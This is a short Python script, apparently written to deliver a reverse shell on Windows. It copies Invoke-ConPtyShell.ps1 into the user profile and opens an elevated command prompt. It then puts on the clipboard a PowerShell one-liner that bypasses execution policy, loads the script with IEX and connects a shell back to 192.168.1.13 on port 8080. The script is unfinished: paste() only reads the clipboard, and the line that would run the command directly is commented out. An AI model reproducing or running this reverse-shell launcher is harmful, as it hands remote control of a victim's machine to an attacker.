import subprocess
import time
import pyperclip

# Get the user profile directory
user = subprocess.check_output(["echo", "%userprofile%"], shell=True, text=True).strip()
print("User profile directory:", user)

# Copy the PowerShell script to the user profile directory
src = 'Invoke-ConPtyShell.ps1'
subprocess.run(['xcopy', src, user, '/i', '/y'], shell=True)

# Open a command prompt in the user folder location
# cmd_proc = subprocess.Popen('cmd.exe', cwd=user)
# subprocess.run('powershell -Command "Start-Process cmd -Verb RunAs"', shell=True, cwd=user)
subprocess.run(f'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/k, cd {user}\'"', shell=True)
# subprocess.run('', shell=True, cwd=user)
# subprocess.run('', shell=True, cwd=user)

# Wait for the command prompt to open

# # Define the PowerShell command to execute
powershell_cmd = 'powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -Command "IEX (Get-Content -Path .\\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell 192.168.1.13 8080"'

pyperclip.copy(powershell_cmd)

# # Execute the PowerShell command in the same window as the Python script
# subprocess.run(powershell_cmd, shell=True, cwd=user)
time.sleep(2)
pyperclip.paste()
time.sleep(5)
